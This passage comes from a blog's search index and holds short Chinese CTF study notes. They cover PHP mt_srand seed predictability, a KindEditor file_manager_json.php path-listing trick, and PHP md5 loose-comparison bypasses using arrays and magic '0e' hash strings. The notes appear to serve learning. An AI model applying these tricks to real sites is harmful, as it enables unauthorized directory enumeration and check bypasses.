src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> web </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF零碎笔记</title>
      <link href="/posts/11612.html"/>
      <url>/posts/11612.html</url>
      
        <content type="html"><![CDATA[        <h1 id="零碎笔记"   >          <a href="#零碎笔记" class="heading-link"><i class="fas fa-link"></i></a><a href="#零碎笔记" class="headerlink" title="零碎笔记"></a>零碎笔记</h1>      <p>mt_srand( )该函数在PHP4.2.0之前传入任意参数后生成的都是伪随机数，在任何机器上只要运行的同样的seed参数结果都相同，有工具可以爆破</p><span id="more"></span><p>KindEditor编辑器漏洞，在使用该编辑器是在url末尾加上/php/file_manager_json.php?path=路径，就会便利路径中所有内容，特征为前端代码中有对php/file_manager_json.php的引用</p>        <h6 id="md5弱相等绕过："   >          <a href="#md5弱相等绕过：" class="heading-link"><i class="fas fa-link"></i></a><a href="#md5弱相等绕过：" class="headerlink" title="md5弱相等绕过："></a>md5弱相等绕过：</h6>      <p>1、构造数组a[]=xxxx&amp;b[]=xxxx</p><p>2、弱相等时转换为相同数据类型，0e开头的字符串会被转为0，字符串如下</p><pre class="line-numbers language-none"><code class="language-none">QNKCDZO&#x2F;&#x2F;0e830400451993494058024219903391s878926199a&#x2F;&#x2F;0e545993274517709034328855841020s155964671a&#x2F;&#x2F;0e342768416822451524974117254469s214587387a&#x2F;&#x2F;0e848240448830537924465865611904s214587387a&#x2F;&#x2F;0e848240448830537924465865611904s878926199a&#x2F;&#x2F;0e545993274517709034328855841020s1091221200a&#x2F;&#x2F;0e940624217856561557816327384675<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF</title>
      <link href="/posts/58958.html"/>
      <url>/posts/58958.html</url>
      
        <content type="html"><![CDATA[<p>Jlan的CTF之旅从现在开始了</p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      
        <tags>
            
            <tag> Note </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
